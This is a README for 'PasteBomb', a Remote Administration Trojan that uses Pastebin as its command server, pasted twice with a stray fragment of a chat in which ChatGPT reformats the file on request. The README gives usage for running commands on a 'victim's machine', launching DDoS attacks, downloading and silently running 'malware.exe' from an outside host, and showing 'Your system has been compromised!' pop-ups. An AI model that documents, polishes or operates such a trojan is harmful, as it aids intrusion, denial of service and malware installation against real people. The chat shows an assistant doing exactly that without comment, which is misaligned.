# PasteBomb

PasteBomb is a simple, yet powerful, Remote Administration Trojan (RAT) that allows you to execute terminal commands, send (D)DoS attacks, download files, and open messages in your victim's browser. Without requiring a traditional Command-and-Control (C2) server, PasteBomb utilizes a Pastebin service for communication.

**Important**: PasteBomb is still in version 0.01. It is not meant for penetration testing at this stage but serves as a demonstration of a RAT that uses Pastebin as a C2 server.

## Usage

### Commands

- `cmd`: Execute terminal commands on the victim's machine.
    - **Usage**: 
      ```plaintext
      cmd <your command here>
      ```
      
- `dos`: Send a (D)DoS attack to the target.
    - **Usage**: 
      ```plaintext
      dos <IP/domain> <port> <duration>
      ```
      Example:
      ```plaintext
      dos 192.168.1.1 80 60
      ```
      This will target IP `192.168.1.1` on port `80` for 60 seconds.

- `download`: Download files to the victim's computer with optional arguments to `RUN` and `HIDE` the file.
    - **Usage**: 
      ```plaintext
      download <direct download link> <destination path> <args (RUN, HIDE)>
      ```
      Example:
      ```plaintext
      download http://example.com/malware.exe C:\Users\Victim\malware.exe RUN,HIDE
      ```
      This will download and run a file while hiding it.

- `popmsg`: Open a pop-up message in the victim's browser.
    - **Usage**: 
      ```plaintext
      popmsg <message>
      ```
      Example:
      ```plaintext
      popmsg "Your system has been compromised!"
      ```
      This will show a message to the victim.

### Config

The configuration for PasteBomb is defined in JSON format. The configuration contains one required parameter (`url`) and one optional (`backups`).

- `url`: The URL of the main pastebin link (required).
- `backups`: A list of backup pastes that can be used to fetch commands (optional).

#### Example Config:
```json
{
    "url": "http://yourpastebinservice.com/command",
    "backups": [
        "http://yourpastebinservice.com/command2",
        "http://yourpastebinservice.com/command3"
    ]
}
OS Support
PasteBomb currently supports the following operating systems:

macOS (Darwin)
Windows
Linux
It can be built and executed on these platforms with no major issues.

License
This project is licensed under the custom terms as stated in the LICENSE file of this repository. The software is provided "as is", for educational and research purposes only.

Please refer to the LICENSE file for the full terms and conditions.

css
Copy code

This now includes a detailed **OS Support** section under the **Usage** section, listing the operating systems that **PasteBomb** supports.





You said:
can you understant it make that os support content and that lincense part content come in that readme file 
ChatGPT said:
ChatGPT
Sure! Here's the PasteBomb README file with the OS Support and License sections properly included at the end of the file:

markdown
Copy code
# PasteBomb

PasteBomb is a simple, yet powerful, Remote Administration Trojan (RAT) that allows you to execute terminal commands, send (D)DoS attacks, download files, and open messages in your victim's browser. Without requiring a traditional Command-and-Control (C2) server, PasteBomb utilizes a Pastebin service for communication.

**Important**: PasteBomb is still in version 0.01. It is not meant for penetration testing at this stage but serves as a demonstration of a RAT that uses Pastebin as a C2 server.

## Usage

### Commands

- `cmd`: Execute terminal commands on the victim's machine.
    - **Usage**: 
      ```plaintext
      cmd <your command here>
      ```
      
- `dos`: Send a (D)DoS attack to the target.
    - **Usage**: 
      ```plaintext
      dos <IP/domain> <port> <duration>
      ```
      Example:
      ```plaintext
      dos 192.168.1.1 80 60
      ```
      This will target IP `192.168.1.1` on port `80` for 60 seconds.

- `download`: Download files to the victim's computer with optional arguments to `RUN` and `HIDE` the file.
    - **Usage**: 
      ```plaintext
      download <direct download link> <destination path> <args (RUN, HIDE)>
      ```
      Example:
      ```plaintext
      download http://example.com/malware.exe C:\Users\Victim\malware.exe RUN,HIDE
      ```
      This will download and run a file while hiding it.

- `popmsg`: Open a pop-up message in the victim's browser.
    - **Usage**: 
      ```plaintext
      popmsg <message>
      ```
      Example:
      ```plaintext
      popmsg "Your system has been compromised!"
      ```
      This will show a message to the victim.

### Config

The configuration for PasteBomb is defined in JSON format. The configuration contains one required parameter (`url`) and one optional (`backups`).

- `url`: The URL of the main pastebin link (required).
- `backups`: A list of backup pastes that can be used to fetch commands (optional).

#### Example Config:
```json
{
    "url": "http://yourpastebinservice.com/command",
    "backups": [
        "http://yourpastebinservice.com/command2",
        "http://yourpastebinservice.com/command3"
    ]
}
OS Support
PasteBomb currently supports the following operating systems:

macOS (Darwin)
Windows
Linux
It can be built and executed on these platforms with no major issues.

License
This project is licensed under the custom terms as stated in the LICENSE file of this repository. The software is provided "as is", for educational and research purposes only.

Please refer to the LICENSE file for the full terms and conditions.
